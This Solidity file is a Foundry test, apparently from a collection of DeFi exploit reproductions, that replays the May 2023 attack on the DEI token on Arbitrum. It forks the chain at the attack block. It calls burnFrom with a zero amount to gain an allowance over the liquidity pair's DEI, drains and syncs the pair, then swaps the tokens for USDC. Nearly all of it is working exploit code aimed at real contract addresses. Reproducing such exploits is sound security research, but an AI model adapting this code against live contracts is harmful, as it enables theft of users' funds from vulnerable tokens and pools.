// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/eugenioclrc/status/1654576296507088906
// @TX
// https://arbiscan.io/tx/0xb1141785b7b94eb37c39c37f0272744c6e79ca1517529fec3f4af59d4c3c37ef

interface IStablePair {
    function sync() external;
    function skim() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IDEI is IERC20 {
    function burnFrom(address account, uint256 amount) external;
}

contract DEIPocTest is Test {
    IStablePair pair = IStablePair(0x7DC406b9B904a52D10E19E848521BbA2dE74888b);
    IDEI DEI = IDEI(0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/arbitrum", 87_626_024);
    }

    function testExploit() public {
        console.log("DEI balance: ", DEI.balanceOf(address(this)));

        DEI.approve(address(pair), type(uint256).max);
        DEI.burnFrom(address(pair), 0);
        DEI.transferFrom(address(pair), address(this), DEI.balanceOf(address(pair)) - 1);
        console.log("DEI balance from attacker: ", DEI.balanceOf(address(this)));

        pair.sync();

        DEI.transfer(address(pair), DEI.balanceOf(address(this)));
        pair.swap(0, 5_047_470_472_572, address(this), "");
        console.log("USDC balance after: ", USDC.balanceOf(address(this)));
    }
}
